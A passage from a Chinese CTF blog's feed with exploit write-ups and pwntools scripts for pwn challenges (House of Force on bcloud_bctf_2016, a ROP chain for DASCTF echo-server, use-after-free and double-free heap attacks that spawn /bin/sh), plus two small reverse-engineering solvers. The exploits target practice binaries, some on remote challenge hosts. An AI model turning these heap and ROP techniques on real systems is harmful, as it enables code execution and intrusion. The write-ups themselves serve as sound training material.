:io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,date)</span>:</span>    sla(<span class="hljs-string">'2:puts'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))    ru(<span class="hljs-string">'bin addr 0x'</span>)    heapaddr = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)    info_addr(<span class="hljs-string">'heapaddr'</span>,heapaddr)    sa(<span class="hljs-string">'content'</span>,str(date))    <span class="hljs-keyword">return</span> heapaddrpayload = <span class="hljs-number">0x30</span> * <span class="hljs-string">'a'</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>)libc_base = add(<span class="hljs-number">0x200000</span>,<span class="hljs-string">'111'</span>) + <span class="hljs-number">0x200ff0</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)malloc_hook = libc_base + <span class="hljs-number">0x3c4b10</span>heapaddr = add(<span class="hljs-number">0x30</span>,payload)size = malloc_hook-(heapaddr + <span class="hljs-number">0x30</span>) - <span class="hljs-number">0x10</span> - <span class="hljs-number">0x8</span> <span class="hljs-number">-0x8</span> <span class="hljs-number">-0x8</span>print(<span class="hljs-string">'size----&gt;'</span>+hex(size))add(size,<span class="hljs-string">'a'</span>)rce = rce16[<span class="hljs-number">1</span>] + libc_basepayload = p64(<span class="hljs-number">0</span>) + p64(rce) + p64(libc_base + libc.symbols[<span class="hljs-string">'__libc_realloc'</span>] + realloc[<span class="hljs-number">1</span>])add(<span class="hljs-number">0x20</span>,payload)sla(<span class="hljs-string">'2:puts'</span>,<span class="hljs-string">'1'</span>)sla(<span class="hljs-string">'size'</span>,<span class="hljs-string">'30'</span>)<span class="hljs-comment"># dbg()</span>itr()</code></pre></div><h2 id="bcloud-bctf-2016"><a href="#bcloud-bctf-2016" class="headerlink" title="bcloud_bctf_2016"></a><code>bcloud_bctf_2016</code></h2><p>这个题是一个十分精妙的题，漏洞出现在程序初始化。<br><img src="http://qiqianyun.chumen77.xyz/uPic/JMsnrt.png" srcset="/img/loading.gif" alt></p><p>strcpy是以<code>\x00</code>来判断一个字符串是否结束的。<br>在栈中，当输入0x40个字符时，因为v2正好在s下面，这就让strcpy从s往v2上面复制时会<strong>把这个堆块的地址也给复制上去</strong>，当其返回name时，也就返回了堆块地址，然后就可以算出堆块的基地址。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/5n1Rtx.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/BGZjNT.png" srcset="/img/loading.gif" alt></p><p>到了这个也是这个漏洞，填充完0x40个字符后，会把org堆块的指针和v3里面的内容给复制到org对应的堆块里，也就是0x40 + 4 + len(v3)字节的东西。org在堆块排布中也是最后一个，如果传过去<code>0xffffffff</code>,就可以改到top chunk的size位。</p><h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><ul><li>leak堆块base</li><li>修改top chunk size</li><li>hof到heaplist处</li><li>给heaplist写上free got，用edit，修改其为puts</li><li>泄漏libc地址</li><li>修改free got 为system，然后指向<code>/bin/sh\x00</code></li></ul><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./bcloud_bctf_2016'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># '../libc.so.6</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    context.log_level = <span class="hljs-string">'debug'</span>    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27301</span>)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">name</span><span class="hljs-params">(name)</span>:</span>    sa(<span class="hljs-string">'name'</span>,str(name))    ru(<span class="hljs-string">'b'</span>)    heapbase = uu32(r(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x8</span>    info_addr(<span class="hljs-string">'heapbase'</span>,heapbase)    <span class="hljs-keyword">return</span> heapbase<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">org</span><span class="hljs-params">(org,host)</span>:</span>    sa(<span class="hljs-string">'Org:'</span>,str(org))    sla(<span class="hljs-string">'Host:'</span>,str(host))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,content)</span>:</span>    sla(<span class="hljs-string">'option---&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'length'</span>,str(size))    sa(<span class="hljs-string">'content:'</span>,str(content))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(id,content)</span>:</span>    sla(<span class="hljs-string">'---&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'id'</span>,str(id))    sa(<span class="hljs-string">'the new content'</span>,str(content))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(id)</span>:</span>    sla(<span class="hljs-string">'-&gt;'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'id'</span>,str(id))context.log_level = <span class="hljs-string">'debug'</span>sizelist = <span class="hljs-number">0x804B0A0</span>heaplist = <span class="hljs-number">0x804B120</span>heapbase = name(<span class="hljs-string">'a'</span> * (<span class="hljs-number">0x40</span><span class="hljs-number">-1</span>) + <span class="hljs-string">'b'</span>)top = heapbase + <span class="hljs-number">0xd8</span>info_addr(<span class="hljs-string">'top'</span>,top)org(<span class="hljs-string">'b'</span>*<span class="hljs-number">0x40</span>,p32(<span class="hljs-number">0xffffffff</span>)) <span class="hljs-comment">#chang top chunk size</span>size = heaplist - top - <span class="hljs-number">0x10</span>add(size,<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x18</span>,<span class="hljs-string">'\n'</span>)payload = p32(<span class="hljs-number">0</span>) + p32(elf.got[<span class="hljs-string">'free'</span>]) + p32(elf.got[<span class="hljs-string">'atoi'</span>])  +p32(<span class="hljs-number">0x804B128</span>+<span class="hljs-number">4</span>+<span class="hljs-number">4</span>) + <span class="hljs-string">'/bin/sh\x00'</span>edit(<span class="hljs-number">1</span>,payload + <span class="hljs-string">'\n'</span>)puts_plt = elf.plt[<span class="hljs-string">'puts'</span>]edit(<span class="hljs-number">1</span>,p32(puts_plt) + <span class="hljs-string">'\n'</span>)free(<span class="hljs-number">2</span>)io.recv(<span class="hljs-number">1</span>)io.recv(<span class="hljs-number">1</span>)atoi = uu32(r(<span class="hljs-number">4</span>))info_addr(<span class="hljs-string">'atoi'</span>,atoi)libc = LibcSearcher(<span class="hljs-string">'atoi'</span>,atoi)libc_base = atoi - libc.dump(<span class="hljs-string">'atoi'</span>)system = libc_base + libc.dump(<span class="hljs-string">'system'</span>)info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)edit(<span class="hljs-number">1</span>,p32(system) + <span class="hljs-string">'\n'</span>)free(<span class="hljs-number">3</span>)itr()</code></pre></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;House-of-Force&quot;&gt;&lt;a href=&quot;#House-of-Force&quot; class=&quot;headerlink&quot; title=&quot;House of Force&quot;&gt;&lt;/a&gt;House of Force&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="House系列" scheme="http://chumen77.xyz/tags/House%E7%B3%BB%E5%88%97/"/>
    
      <category term="heap" scheme="http://chumen77.xyz/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF安恒月赛(4th)</title>
    <link href="http://chumen77.xyz/2020/04/25/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B/"/>
    <id>http://chumen77.xyz/2020/04/25/DASCTF安恒月赛/</id>
    <published>2020-04-25T13:48:11.966Z</published>
    <updated>2020-10-20T02:06:34.671Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DASCTF安恒月赛-pwn"><a href="#DASCTF安恒月赛-pwn" class="headerlink" title="DASCTF安恒月赛-pwn"></a>DASCTF安恒月赛-pwn</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>开赛了，有点事情没打，晚上复现了一下。</p><h2 id="echo-server"><a href="#echo-server" class="headerlink" title="echo-server"></a>echo-server</h2><div class="hljs"><pre><code class="hljs python">[*] <span class="hljs-string">'/ctf/work/ahys/echo server/test'</span>    Arch:     amd64<span class="hljs-number">-64</span>-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (<span class="hljs-number">0x400000</span>)</code></pre></div><p>程序很简单，经典栈溢出，rop利用即可。<br>但是因为是64位的，并且是glibc2.27，发现在做的时候构造rop链总是会cursh，<br>调试发现：<br><img src="http://qiqianyun.chumen77.xyz/uPic/jfAEUD.png" srcset="/img/loading.gif" alt><br>发现这段汇编直接会让程序cursh，想起来ex师傅一篇文章分析过，64位程序rop到system拿shell的时候也会这样。但是很奇怪这个也出现了，索性尝试一波。<br>解决办法：还是加个ret，让栈对其即可。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *local_file  = <span class="hljs-string">'./test'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc-2.27.so'</span>remote_libc = <span class="hljs-string">'./libc.so.6'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    <span class="hljs-comment"># io = remote('node3.buuoj.cn',25390)</span>    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = <span class="hljs-string">'debug'</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'splitw'</span>,<span class="hljs-string">'-h'</span>]<span class="hljs-comment">#,'neww'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span><span class="hljs-params">()</span>:</span><span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript="b main")</span>gdb.attach(io)pause()pop_rdi = <span class="hljs-number">0x0000000000400823</span><span class="hljs-comment"># : pop rdi ; ret</span>offset = <span class="hljs-number">136</span>start = <span class="hljs-number">0x4005C0</span>ret = <span class="hljs-number">0x0400768</span>sla(<span class="hljs-string">'how long is your name:'</span>,<span class="hljs-string">'500'</span>)payload = <span class="hljs-string">'\x00'</span> * offset + flat([ret,pop_rdi,elf.got[<span class="hljs-string">'read'</span>],elf.plt[<span class="hljs-string">'printf'</span>],start])<span class="hljs-comment"># dbg()</span>sla(<span class="hljs-string">'s you name?'</span>,payload)ru(<span class="hljs-string">'hello '</span>)read = uu64(r(<span class="hljs-number">6</span>))info_addr(<span class="hljs-string">'printf'</span>,read)libc_base = read - libc.symbols[<span class="hljs-string">'read'</span>]info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)binsh = libc_base  + libc.search(<span class="hljs-string">"/bin/sh"</span>).next()system = libc_base + libc.sym[<span class="hljs-string">'system'</span>]sla(<span class="hljs-string">'how long is your name: '</span>,<span class="hljs-string">'500'</span>)payload = <span class="hljs-string">'\x00'</span> * offset + flat([ret,pop_rdi,binsh,system])<span class="hljs-comment"># rec = 0x4f322 + libc_base</span><span class="hljs-comment"># dbg()</span>sla(<span class="hljs-string">'s you name?'</span>,payload)itr()</code></pre></div><h2 id="入门reverse"><a href="#入门reverse" class="headerlink" title="入门reverse"></a>入门reverse</h2><div class="hljs"><pre><code class="hljs python">s = <span class="hljs-string">'akhb~chdaZrdaZudqduvdZvvv|'</span>flag = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">26</span>):    flag += chr((ord(s[i]) - <span class="hljs-number">1</span>) ^ <span class="hljs-number">6</span>)print(flag)</code></pre></div><h2 id="Encrypts"><a href="#Encrypts" class="headerlink" title="Encrypts"></a>Encrypts</h2><p>直接爆破了。</p><div class="hljs"><pre><code class="hljs python">s = [<span class="hljs-number">38</span>,<span class="hljs-number">44</span>,<span class="hljs-number">33</span>,<span class="hljs-number">39</span>,<span class="hljs-number">59</span>,<span class="hljs-number">35</span>,<span class="hljs-number">34</span>,<span class="hljs-number">115</span>,<span class="hljs-number">117</span>,<span class="hljs-number">114</span>,<span class="hljs-number">113</span>,<span class="hljs-number">33</span>,<span class="hljs-number">36</span>,<span class="hljs-number">117</span>,<span class="hljs-number">118</span>,<span class="hljs-number">119</span>,<span class="hljs-number">35</span>,<span class="hljs-number">120</span>,<span class="hljs-number">38</span>,<span class="hljs-number">114</span>,<span class="hljs-number">117</span>,<span class="hljs-number">113</span>,<span class="hljs-number">38</span>,<span class="hljs-number">34</span>,<span class="hljs-number">113</span>,<span class="hljs-number">114</span>,<span class="hljs-number">117</span>,<span class="hljs-number">114</span>,<span class="hljs-number">36</span>,<span class="hljs-number">112</span>,<span class="hljs-number">115</span>,<span class="hljs-number">118</span>,<span class="hljs-number">121</span>,<span class="hljs-number">112</span>,<span class="hljs-number">35</span>,<span class="hljs-number">37</span>,<span class="hljs-number">121</span>,<span class="hljs-number">61</span>]<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">128</span>):    flag = <span class="hljs-string">''</span>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">38</span>):        flag += chr(s[j] ^ i)    <span class="hljs-keyword">if</span> flag[:<span class="hljs-number">4</span>] == <span class="hljs-string">'flag'</span>:        print(flag)</code></pre></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DASCTF安恒月赛-pwn&quot;&gt;&lt;a href=&quot;#DASCTF安恒月赛-pwn&quot; class=&quot;headerlink&quot; title=&quot;DASCTF安恒月赛-pwn&quot;&gt;&lt;/a&gt;DASCTF安恒月赛-pwn&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot;
      
    
    </summary>
    
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="rop" scheme="http://chumen77.xyz/tags/rop/"/>
    
      <category term="uaf" scheme="http://chumen77.xyz/tags/uaf/"/>
    
  </entry>
  
  <entry>
    <title>uaf和double free</title>
    <link href="http://chumen77.xyz/2020/04/25/uaf%E5%92%8Cdouble%20free/"/>
    <id>http://chumen77.xyz/2020/04/25/uaf和double free/</id>
    <published>2020-04-25T03:40:09.709Z</published>
    <updated>2020-06-27T16:24:30.624Z</updated>
    
    <content type="html"><![CDATA[<h1 id="uaf和double-free"><a href="#uaf和double-free" class="headerlink" title="uaf和double free"></a>uaf和double free</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近开始打算入门堆，简单记录几道相关的题。</p><h2 id="hitcontraining-uaf"><a href="#hitcontraining-uaf" class="headerlink" title="hitcontraining-uaf"></a>hitcontraining-uaf</h2><p>题目较为简单存在后门函数，利用uaf漏洞攻击即可。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *local_file  = <span class="hljs-string">'./hacknote'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># '../libc.so.6'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27892</span>)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = <span class="hljs-string">'debug'</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'splitw'</span>,<span class="hljs-string">'-h'</span>]<span class="hljs-comment">#,'neww'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span><span class="hljs-params">()</span>:</span><span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript="b main")</span>gdb.attach(io)pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,content)</span>:</span>    sl(<span class="hljs-string">'1'</span>)    ru(<span class="hljs-string">'Note size '</span>)    sl(str(size))    ru(<span class="hljs-string">'Content :'</span>)    sl(str(content))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dele</span><span class="hljs-params">(index)</span>:</span>    sl(<span class="hljs-string">'2'</span>)    sl(str(index))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(index)</span>:</span>    sl(<span class="hljs-string">'3'</span>)    sl(str(index))ru(<span class="hljs-string">'Your choice :'</span>)add(<span class="hljs-number">16</span>,<span class="hljs-string">'aaaa'</span>)ru(<span class="hljs-string">'Your choice :'</span>)add(<span class="hljs-number">16</span>,<span class="hljs-string">'bbbb'</span>)ru(<span class="hljs-string">'Your choice :'</span>)dele(<span class="hljs-number">0</span>)ru(<span class="hljs-string">'Your choice :'</span>)dele(<span class="hljs-number">1</span>)ru(<span class="hljs-string">'Your choice :'</span>)add(<span class="hljs-number">8</span>,p32(elf.symbols[<span class="hljs-string">'magic'</span>]))ru(<span class="hljs-string">'Your choice :'</span>)show(<span class="hljs-number">0</span>)itr()</code></pre></div><h2 id="ACTF-2019-babyheap"><a href="#ACTF-2019-babyheap" class="headerlink" title="ACTF_2019_babyheap"></a><code>ACTF_2019_babyheap</code></h2><p>题目有system函数，并且也有<code>/bin/sh\x00</code> ，当时在构造这个<code>/bin/sh\x00</code>的字符串指针的时候费了一点劲，结果发现elf有这个字符串。然后就很简单了，控制好参数即可。还是uaf漏洞进行攻击。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *local_file  = <span class="hljs-string">'./ACTF_2019_babyheap'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># '../libc.so.6'</span>debug = <span class="hljs-number">1</span> <span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27341</span>)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = <span class="hljs-string">'debug'</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'splitw'</span>,<span class="hljs-string">'-h'</span>]<span class="hljs-comment">#,'neww'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span><span class="hljs-params">()</span>:</span><span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript="b main")</span>gdb.attach(io)pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,content)</span>:</span>    sla(<span class="hljs-string">'Your choice: '</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size: \n'</span>,str(size))    sa(<span class="hljs-string">'content: \n'</span>,str(content)) <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dele</span><span class="hljs-params">(index)</span>:</span>    sla(<span class="hljs-string">': '</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'index: \n'</span>,str(index))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(index)</span>:</span>sla(<span class="hljs-string">': '</span>,<span class="hljs-string">'3'</span>)sla(<span class="hljs-string">'index: \n'</span>,str(index))add(<span class="hljs-number">32</span>,<span class="hljs-string">'aaaaaaaa'</span>) <span class="hljs-comment">#0</span>add(<span class="hljs-number">32</span>,<span class="hljs-string">'bbbbbbbb'</span>) <span class="hljs-comment">#1</span>dele(<span class="hljs-number">0</span>)dele(<span class="hljs-number">1</span>)binsh = <span class="hljs-number">0x602010</span>add(<span class="hljs-number">16</span>,flat(binsh,elf.plt[<span class="hljs-string">'system'</span>]))<span class="hljs-comment"># dbg()</span>show(<span class="hljs-number">0</span>)itr()</code></pre></div><h2 id="actf-2019-message"><a href="#actf-2019-message" class="headerlink" title="actf-2019-message"></a>actf-2019-message</h2><p>Double free，迁移到伪造的堆块，注意控制好伪造堆块的size跟fastbin的对应。<br>改<code>__free_hook</code>为system即可。<code>__free_hook</code>的参数正好是堆块的date，较好控制。<br>（buu给的复现环境是18的，有了tcache机制，但是本人还不太熟悉，只是知道不检查size是否对应了，在16上做的，然后就调试改了改脚本，打通了buu的复现环境。下面的exp也是18的。）</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *local_file  = <span class="hljs-string">'./ACTF_2019_message'</span><span class="hljs-comment"># local_libc  = '/lib/x86_64-linux-gnu/libc-2.27.so'</span><span class="hljs-comment"># remote_libc = local_libc # '../libc.so.6'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    <span class="hljs-comment"># libc = ELF(local_libc)</span><span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25390</span>)    <span class="hljs-comment"># libc = ELF(remote_libc)</span>elf = ELF(local_file)libc = elf.libccontext.log_level = <span class="hljs-string">'debug'</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'splitw'</span>,<span class="hljs-string">'-h'</span>]<span class="hljs-comment">#,'neww'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span><span class="hljs-params">()</span>:</span><span class="hljs-comment"># 